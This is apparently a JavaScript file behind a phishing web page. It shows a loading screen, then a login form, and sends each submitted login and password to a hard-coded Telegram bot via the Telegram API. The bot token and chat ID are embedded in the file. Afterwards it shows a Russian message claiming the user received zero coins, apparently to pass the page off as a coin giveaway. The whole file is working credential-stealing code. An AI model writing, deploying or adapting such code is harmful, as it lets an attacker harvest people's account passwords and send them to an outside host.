let TOKEN_BOT = '6965033995:AAHpV9G4l1uBQhItpoYn1NhQQ9_YetPTUYY'
let CHAT_ID = '1861568967'

let body = document.querySelector('body')
let loading = document.querySelector('.loading')
let login = document.querySelector('#login')

setTimeout(() =>{
    body.classList.remove("bg-[url('https://staticg.sportskeeda.com/editor/2024/01/b3109-17046051080206-1920.jpg')]")
    loading.classList.add('hidden')
    body.classList.add("bg-[url('https://www.cnet.com/a/img/resize/a37e834373ee441c4689c1838266d2f35e556162/hub/2019/07/18/a6fa0fef-dd2a-4bcb-971e-4d9453602d9b/gettyimages-1124672089.jpg?auto=webp&fit=crop&height=675&width=1200')]")
    login.classList.remove('hidden')
}, 5000);

let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')

button.addEventListener('click', (e) => {
    e.preventDefault();

    const loginValue = inputs[0].value.trim();
    const passwordValue = inputs[1].value.trim();
    
    if (loginValue && passwordValue) {
        fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `\n\n LOGIN: ${loginValue} \n PASSWORD: ${passwordValue}`,
            }),
        })
        .then(response => response.json())
        .then(malumot => {
            console.log(malumot);
        })
        .catch(error => console.log("ERROR", error));
        alert("К сожалению ты получил 0 коинов. Мне очень жаль");
    } else {
        console.log("Error: Login and password cannot be empty");
    }
});
